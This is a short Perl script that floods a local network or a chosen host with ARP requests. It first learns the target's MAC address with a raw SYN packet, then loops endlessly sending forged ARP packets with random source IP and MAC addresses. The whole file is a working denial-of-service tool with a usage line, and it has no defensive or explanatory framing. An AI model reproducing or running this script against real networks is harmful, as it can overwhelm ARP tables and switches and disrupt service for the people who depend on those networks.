#!/usr/bin/perl
use Net::ARP 1.0;
use Net::RawIP;

$mode = shift;
$interface = shift;
$host = shift;

if(!$host){ print "usage: $0 <bcast|direct> <interface> <host>\n"; exit(-1); }

sub r { return int(rand(255)); }

if( $mode =~ /direct/ ) {
  print "sending syn packet to add local ARP entry\n";
  $pkt = new Net::RawIP;
  $pkt->set({ip=>{daddr=>$host},tcp=>{source=>int(rand(65535)),dest=>int(rand(65535)),syn=>1,seq=>0,ack=>0}});
  $pkt->send;
  print "looking up mac address\n";
  $dmac = Net::ARP::arp_lookup($interface,$host);
}
else {
  $dmac = "ff:ff:ff:ff:ff:ff";
}

print "sending arp packets, press ctrl-c to stop\n";
while(){
  $randip = sprintf("%d.%d.%d.%d",r(),r(),r(),r());
  $smac = sprintf("%x:%x:%x:%x:%x:%x",r(),r(),r(),r(),r(),r());
# this slows it down.
# if( $mode =~ /bcast/ ) { print "$interface://$randip/$smac -> $host/$dmac\n"; } 
  Net::ARP::send_packet( $interface,$randip,$host,$smac,$dmac,request);
}
